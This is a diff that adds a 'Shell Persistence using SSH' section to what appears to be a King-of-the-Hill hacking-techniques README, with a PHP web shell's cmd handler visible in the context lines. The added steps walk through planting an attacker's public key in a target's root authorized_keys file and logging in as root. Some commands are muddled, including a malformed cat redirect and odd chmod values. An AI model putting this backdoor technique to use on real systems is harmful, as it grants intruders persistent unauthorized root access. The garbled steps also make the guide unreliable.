@@ -175,6 +175,45 @@ if(isset($_REQUEST['cmd'])){
 ?>
 ```
 
+## ---> Shell Persistence using SSH <---
 
+**Shell Persistence using SSH - Attacker Terminal & Target Terminal**
 
+Step 1: Navigate to the SSH directory on your Target Terminal - 
 
+```
+cd /root/.ssh
+```
+Step 1.2 :- Return to your attacker Terminal and execute: 
+```
+cd /root/.ssh
+```
+Step 2: Return to your attacker terminal and execute:
+```
+ssh-keygen -t rsa
+```
+
+[Attacker Terminal] Step 3: Display the content of id_rsa.pub using cat id_rsa.pub and copy its content using:
+```
+cat id_rsa.pub """ <Content> """ > authorized_keys
+```
+**Example:**
+![Screenshot_2024-01-04_19-28-42](https://github.com/DevVj-1/Koth-Hacker-Vs-Hacker_Techniques-/assets/106962581/d90c075a-92a0-4f49-85d5-91d1d8231c89)
+
+[Attacker Terminal] Step 4: Set the permissions for id_rsa - 
+```
+chmod 600 id_rsa
+```
+
+**Attacker Terminal Step 4.1: Send authorized_keys to the target system.:)**
+
+[Target Terminal] Step 5: Set permissions for authorized_keys -
+```
+chmod 700 authorized_keys
+```
+
+[Attacker Terminal] Step 6: Connect to the target system using the generated key - 
+
+```
+ssh -i id_rsa root@127.0.0.1
+```
